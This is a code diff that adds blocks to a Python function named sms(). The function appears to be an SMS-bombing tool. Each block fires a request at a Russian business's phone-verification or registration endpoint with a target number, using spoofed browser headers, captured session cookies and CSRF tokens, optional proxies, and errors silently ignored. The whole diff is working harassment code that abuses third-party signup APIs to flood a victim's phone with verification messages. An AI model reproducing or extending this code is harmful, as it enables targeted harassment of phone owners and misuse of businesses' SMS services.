@@ -781,6 +781,32 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					header = {
+						"Accept": "application/json",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "109",
+						"Content-type": "application/json",
+						"dnt": "1",
+						"Host": "api.5element-mfo.ru",
+						"Origin": "https://lk.5element-mfo.ru",
+						"Referer": "https://lk.5element-mfo.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+					payload = {"id":2,"jsonrpc":"2.0","method":"auth.login","params":{"phoneNumber":number,"defaultInn":4025443121}}
+					requests.post("https://api.5element-mfo.ru/", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
 					num = number
 					num2=""
 					num2+="+"
@@ -804,6 +830,160 @@ def sms(prx, number, tm, code):
 						"number": num2
 					}
 					requests.get(f"https://www.winelab.ru/login/send/confirmationcode?number={num2}", data=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "*/*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "348",
+						"content-type": "multipart/form-data; boundary=----WebKitFormBoundaryGdd8odVehrBwv6tC",
+						"cookie": "PHPSESSID=se7cfta08doi342vbf8hnnsd6s; chunk_swiper=load; preload=%7B%22fonts%22%3A%221%22%7D; metrics=load; choice2=0",
+						"dnt": "1",
+						"origin": "https://xn---63-5cdesg4ei.xn--p1ai",
+						"referer": "https://xn---63-5cdesg4ei.xn--p1ai/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-requested-with": "XMLHttpRequest"
+					}
+					payload = {
+						"phone": num2,
+						"name": "Василий",
+						"confirm": "on"
+					}
+					requests.post("https://xn---63-5cdesg4ei.xn--p1ai/users/regSave/", data=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
+					header = {
+						"accept": "application/json, text/plain, */*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"connection": "keep-alive",
+						"content-length": "57",
+						"content-type": "application/json",
+						"dnt": "1",
+						"origin": "https://cargomart.ru",
+						"referer": "https://cargomart.ru/registration",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-Dest": "empty",
+						"sec-fetch-Mode": "cors",
+						"sec-fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-client-version": "20220120122627",
+						"x-fgp": "2be2e977a89b4544fc76083a5d61e1af"
+					}
+					payload = {"login":number,"confirm":True,"role":"consignor"}
+					requests.post("https://cargomart.ru/api/v2/registration", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "*/*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "30",
+						"content-type": "application/json;charset=UTF-8",
+						"cookie": "deduplication_cookie=yandex; rrpvid=793863222494807; session-cookie=16cc7e68d8974e3d28da8fbc1e808458a63de189b766c3fff29b7339e793a17d71ab4f67134c1acd42486e08cd5581a5; XSRF-TOKEN=eyJpdiI6Ik1FUUdMd29SRm1pdkFTNHdtSUpPenc9PSIsInZhbHVlIjoiKzV2Z0NzdXdUUTZ2dUQ0QkpZaU55OFUzQmlLcWF3dlVyK3hpZWpudGl2OWJaV1c5MUloVjlXb2orVHJxVUtIZiIsIm1hYyI6ImRhNDU0MTBiOGQ2ZTYzNTE0MmFjODdhYzYxMTY0NjY3NTBmYjU0ZGJkMTMyMmUzZmUwNjAyMzBhMzA5ODI1ZTAifQ%3D%3D; laravel_session=eyJpdiI6IjBrS1U1aHVuaGlkbDJGQmJyOURmMUE9PSIsInZhbHVlIjoiNTdNZmRyRzlVOUNlaERrREdZUVpiWHp1SUd1SVlcL2wwbW9pU2lIQ2dlNkVoeW9PeGlIWDB1cWc4TXFrSW5YYzQiLCJtYWMiOiI3NDdhZjg0YjM4YTRkOTkwNDA0MzA3ZmI0NjZjNDM5M2QzM2M4YzUxOTFlMjRjZWEyMjg5ZmM0YzQ3YmRhODI3In0%3D; font=phone",
+						"dnt": "1",
+						"origin": "https://oauth.av.ru",
+						"referer": "https://oauth.av.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-ajax-token": "8c492208b18fc2c0a944ece92c79ff5a20bff3b1308184c07816138d448e2832",
+						"x-csrf-token": "NVlcU4ZX63DwhHfyinnytjO0kWUOxpQNCLg2X2IK",
+						"x-requested-with": "XMLHttpRequest",
+						"x-xsrf-token": "eyJpdiI6Ik1FUUdMd29SRm1pdkFTNHdtSUpPenc9PSIsInZhbHVlIjoiKzV2Z0NzdXdUUTZ2dUQ0QkpZaU55OFUzQmlLcWF3dlVyK3hpZWpudGl2OWJaV1c5MUloVjlXb2orVHJxVUtIZiIsIm1hYyI6ImRhNDU0MTBiOGQ2ZTYzNTE0MmFjODdhYzYxMTY0NjY3NTBmYjU0ZGJkMTMyMmUzZmUwNjAyMzBhMzA5ODI1ZTAifQ=="
+					}
+					payload = {"phone": num2}
+					requests.post("https://oauth.av.ru/check-phone", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "339",
+						"Content-Type": "application/json;charset=UTF-8",
+						"Cookie": "XSRF-TOKEN=eyJpdiI6InlTY2tvVUtvV1pRWW83NHViUEZIYnc9PSIsInZhbHVlIjoibUhqdjU4ZUVXNGlxRjFFcVwvZWw4RkJMSHp6WTRnSzhudUZ4NGxMbGxmbEpEUDcxNFN1RW5TNnozZjVwVkZ3S29CK3NIRGhaTE1NMGlUdGlqVUpHYVRVOXB0cEpXWk1COXIxdEtuYTNyUnRBS2JFbnpraE5sdkJZeUJNUXZLMkVqIiwibWFjIjoiNGRmNGI5OTViZDFmZmFkYTIyZDQzYmQ0YzYzOWQyMWJlMzAxY2Q3OGVkMWEzMzA5MDA0NDk5NjhkYzBkODg0NCJ9; laravel_session=eyJpdiI6Im9hNm10djRzb3d1UVJVU004eEtueHc9PSIsInZhbHVlIjoiQWtEbDRia2huWmJuMFhOQlEzRlVhbTRQUmlcLzJUYk1oY1pwXC9kUGtsTmwzZ2FkZnlHSGNoS2ZzV1JjUGZNelIzYm12NDRLQUo3ZEZjN29XVXU3RjZ2NzNuVDJBTFNEMWJZXC9qY1VzdXNNelRieU9nXC9FcXNHakVjZ29nTktESHlqIiwibWFjIjoiMTU3NWFkNjc5NTViYjNlZTcxZTZlZjBiNzZlZjA0YjgzN2U0NTBhZmEzMzdkN2ZiNmVjN2U2YmM1Nzg4M2M1YiJ9",
+						"dnt": "1",
+						"Host": "kemerovo.kuzbass-online.ru",
+						"Origin": "https://kemerovo.kuzbass-online.ru",
+						"Referer": "https://kemerovo.kuzbass-online.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"sentry-trace": "6249e4ccb1f7419890d49bb62618a0d8-9dd799f4a9bd9888-0",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"X-XSRF-TOKEN": "eyJpdiI6InlTY2tvVUtvV1pRWW83NHViUEZIYnc9PSIsInZhbHVlIjoibUhqdjU4ZUVXNGlxRjFFcVwvZWw4RkJMSHp6WTRnSzhudUZ4NGxMbGxmbEpEUDcxNFN1RW5TNnozZjVwVkZ3S29CK3NIRGhaTE1NMGlUdGlqVUpHYVRVOXB0cEpXWk1COXIxdEtuYTNyUnRBS2JFbnpraE5sdkJZeUJNUXZLMkVqIiwibWFjIjoiNGRmNGI5OTViZDFmZmFkYTIyZDQzYmQ0YzYzOWQyMWJlMzAxY2Q3OGVkMWEzMzA5MDA0NDk5NjhkYzBkODg0NCJ9"
+					}
+					payload = {"phone":number,"firstName":"Вася","lastName":"Пупкин","email":"wegrfrsfrdihkljn@hotmail.com","city":{"id":4,"name":"г. Анжеро-Судженск (Анжеро-Судженский городской округ)","is_active":True,"order":20,"domain":"anzhero-sudzhensk","guid":"8a5314a4-903e-475c-a4db-8f03db3b793f"}}
+					requests.post("https://kemerovo.kuzbass-online.ru/web/v1/auth/start", json=payload, headers=header, proxies = proxies)
 				except:
 					pass
 
@@ -945,6 +1125,33 @@ def sms(prx, number, tm, code):
 
 				try:
 					header = {
+						"accept": "application/json, text/plain, */*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"connection": "keep-alive",
+						"content-length": "57",
+						"content-type": "application/json",
+						"dnt": "1",
+						"origin": "https://cargomart.ru",
+						"referer": "https://cargomart.ru/registration",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-Dest": "empty",
+						"sec-fetch-Mode": "cors",
+						"sec-fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-client-version": "20220120122627",
+						"x-fgp": "2be2e977a89b4544fc76083a5d61e1af"
+					}
+					payload = {"login":number,"confirm":True,"role":"consignor"}
+					requests.post("https://cargomart.ru/api/v2/registration", json=payload, headers=header)
+				except:
+					pass
+
+				try:
+					header = {
 						"Accept": "application/json, text/javascript, */*; q=0.01",
 						"Accept-Encoding": "gzip, deflate, br",
 						"Accept-Language": "en-US,en;q=0.9",
@@ -995,6 +1202,81 @@ def sms(prx, number, tm, code):
 
 				try:
 					header = {
+						"Accept": "application/json",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "109",
+						"Content-type": "application/json",
+						"dnt": "1",
+						"Host": "api.5element-mfo.ru",
+						"Origin": "https://lk.5element-mfo.ru",
+						"Referer": "https://lk.5element-mfo.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+					payload = {"id":2,"jsonrpc":"2.0","method":"auth.login","params":{"phoneNumber":number,"defaultInn":4025443121}}
+					requests.post("https://api.5element-mfo.ru/", json=payload, headers=header)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+='-'
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "*/*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "30",
+						"content-type": "application/json;charset=UTF-8",
+						"cookie": "deduplication_cookie=yandex; rrpvid=793863222494807; session-cookie=16cc7e68d8974e3d28da8fbc1e808458a63de189b766c3fff29b7339e793a17d71ab4f67134c1acd42486e08cd5581a5; XSRF-TOKEN=eyJpdiI6Ik1FUUdMd29SRm1pdkFTNHdtSUpPenc9PSIsInZhbHVlIjoiKzV2Z0NzdXdUUTZ2dUQ0QkpZaU55OFUzQmlLcWF3dlVyK3hpZWpudGl2OWJaV1c5MUloVjlXb2orVHJxVUtIZiIsIm1hYyI6ImRhNDU0MTBiOGQ2ZTYzNTE0MmFjODdhYzYxMTY0NjY3NTBmYjU0ZGJkMTMyMmUzZmUwNjAyMzBhMzA5ODI1ZTAifQ%3D%3D; laravel_session=eyJpdiI6IjBrS1U1aHVuaGlkbDJGQmJyOURmMUE9PSIsInZhbHVlIjoiNTdNZmRyRzlVOUNlaERrREdZUVpiWHp1SUd1SVlcL2wwbW9pU2lIQ2dlNkVoeW9PeGlIWDB1cWc4TXFrSW5YYzQiLCJtYWMiOiI3NDdhZjg0YjM4YTRkOTkwNDA0MzA3ZmI0NjZjNDM5M2QzM2M4YzUxOTFlMjRjZWEyMjg5ZmM0YzQ3YmRhODI3In0%3D; font=phone",
+						"dnt": "1",
+						"origin": "https://oauth.av.ru",
+						"referer": "https://oauth.av.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-ajax-token": "8c492208b18fc2c0a944ece92c79ff5a20bff3b1308184c07816138d448e2832",
+						"x-csrf-token": "NVlcU4ZX63DwhHfyinnytjO0kWUOxpQNCLg2X2IK",
+						"x-requested-with": "XMLHttpRequest",
+						"x-xsrf-token": "eyJpdiI6Ik1FUUdMd29SRm1pdkFTNHdtSUpPenc9PSIsInZhbHVlIjoiKzV2Z0NzdXdUUTZ2dUQ0QkpZaU55OFUzQmlLcWF3dlVyK3hpZWpudGl2OWJaV1c5MUloVjlXb2orVHJxVUtIZiIsIm1hYyI6ImRhNDU0MTBiOGQ2ZTYzNTE0MmFjODdhYzYxMTY0NjY3NTBmYjU0ZGJkMTMyMmUzZmUwNjAyMzBhMzA5ODI1ZTAifQ=="
+					}
+					payload = {"phone": num2}
+					requests.post("https://oauth.av.ru/check-phone", json=payload, headers=header)
+				except:
+					pass
+
+				try:
+					header = {
 						"accept": "application/json, text/plain, */*",
 						"accept-encoding": "gzip, deflate, br",
 						"accept-language": "en",
@@ -1015,6 +1297,84 @@ def sms(prx, number, tm, code):
 
 					payload = {"app_id":"55e085968a5da59241000001","phone":"+"+number}
 					requests.post("https://api.wheely.com/v6/auth/oauth/token", json=payload, headers=header)
+				except:
+					pass
+
+				try:
+					header = {
+						"Accept": "application/json, text/plain, */*",
+						"Accept-Encoding": "gzip, deflate, br",
+						"Accept-Language": "en-US,en;q=0.9",
+						"Connection": "keep-alive",
+						"Content-Length": "339",
+						"Content-Type": "application/json;charset=UTF-8",
+						"Cookie": "XSRF-TOKEN=eyJpdiI6InlTY2tvVUtvV1pRWW83NHViUEZIYnc9PSIsInZhbHVlIjoibUhqdjU4ZUVXNGlxRjFFcVwvZWw4RkJMSHp6WTRnSzhudUZ4NGxMbGxmbEpEUDcxNFN1RW5TNnozZjVwVkZ3S29CK3NIRGhaTE1NMGlUdGlqVUpHYVRVOXB0cEpXWk1COXIxdEtuYTNyUnRBS2JFbnpraE5sdkJZeUJNUXZLMkVqIiwibWFjIjoiNGRmNGI5OTViZDFmZmFkYTIyZDQzYmQ0YzYzOWQyMWJlMzAxY2Q3OGVkMWEzMzA5MDA0NDk5NjhkYzBkODg0NCJ9; laravel_session=eyJpdiI6Im9hNm10djRzb3d1UVJVU004eEtueHc9PSIsInZhbHVlIjoiQWtEbDRia2huWmJuMFhOQlEzRlVhbTRQUmlcLzJUYk1oY1pwXC9kUGtsTmwzZ2FkZnlHSGNoS2ZzV1JjUGZNelIzYm12NDRLQUo3ZEZjN29XVXU3RjZ2NzNuVDJBTFNEMWJZXC9qY1VzdXNNelRieU9nXC9FcXNHakVjZ29nTktESHlqIiwibWFjIjoiMTU3NWFkNjc5NTViYjNlZTcxZTZlZjBiNzZlZjA0YjgzN2U0NTBhZmEzMzdkN2ZiNmVjN2U2YmM1Nzg4M2M1YiJ9",
+						"dnt": "1",
+						"Host": "kemerovo.kuzbass-online.ru",
+						"Origin": "https://kemerovo.kuzbass-online.ru",
+						"Referer": "https://kemerovo.kuzbass-online.ru/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"Sec-Fetch-Dest": "empty",
+						"Sec-Fetch-Mode": "cors",
+						"Sec-Fetch-Site": "same-origin",
+						"sec-gpc": "1",
+						"sentry-trace": "6249e4ccb1f7419890d49bb62618a0d8-9dd799f4a9bd9888-0",
+						"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"X-XSRF-TOKEN": "eyJpdiI6InlTY2tvVUtvV1pRWW83NHViUEZIYnc9PSIsInZhbHVlIjoibUhqdjU4ZUVXNGlxRjFFcVwvZWw4RkJMSHp6WTRnSzhudUZ4NGxMbGxmbEpEUDcxNFN1RW5TNnozZjVwVkZ3S29CK3NIRGhaTE1NMGlUdGlqVUpHYVRVOXB0cEpXWk1COXIxdEtuYTNyUnRBS2JFbnpraE5sdkJZeUJNUXZLMkVqIiwibWFjIjoiNGRmNGI5OTViZDFmZmFkYTIyZDQzYmQ0YzYzOWQyMWJlMzAxY2Q3OGVkMWEzMzA5MDA0NDk5NjhkYzBkODg0NCJ9"
+					}
+					payload = {"phone":number,"firstName":"Вася","lastName":"Пупкин","email":"wegrfrsfrdihkljn@hotmail.com","city":{"id":4,"name":"г. Анжеро-Судженск (Анжеро-Судженский городской округ)","is_active":True,"order":20,"domain":"anzhero-sudzhensk","guid":"8a5314a4-903e-475c-a4db-8f03db3b793f"}}
+					requests.post("https://kemerovo.kuzbass-online.ru/web/v1/auth/start", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
+					num = number
+					num2=""
+					num2+="+"
+					num2+=code
+					num2+=' '
+					num2+="("
+					num2+=num[1]
+					num2+=num[2]
+					num2+=num[3]
+					num2+=")"
+					num2+=' '
+					num2+=num[4]
+					num2+=num[5]
+					num2+=num[6]
+					num2+='-'
+					num2+=num[7]
+					num2+=num[8]
+					num2+=num[9]
+					num2+=num[10]
+					header = {
+						"accept": "*/*",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "348",
+						"content-type": "multipart/form-data; boundary=----WebKitFormBoundaryGdd8odVehrBwv6tC",
+						"cookie": "PHPSESSID=se7cfta08doi342vbf8hnnsd6s; chunk_swiper=load; preload=%7B%22fonts%22%3A%221%22%7D; metrics=load; choice2=0",
+						"dnt": "1",
+						"origin": "https://xn---63-5cdesg4ei.xn--p1ai",
+						"referer": "https://xn---63-5cdesg4ei.xn--p1ai/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)",
+						"x-requested-with": "XMLHttpRequest"
+					}
+					payload = {
+						"phone": num2,
+						"name": "Василий",
+						"confirm": "on"
+					}
+					requests.post("https://xn---63-5cdesg4ei.xn--p1ai/users/regSave/", data=payload, headers=header)
 				except:
 					pass
 
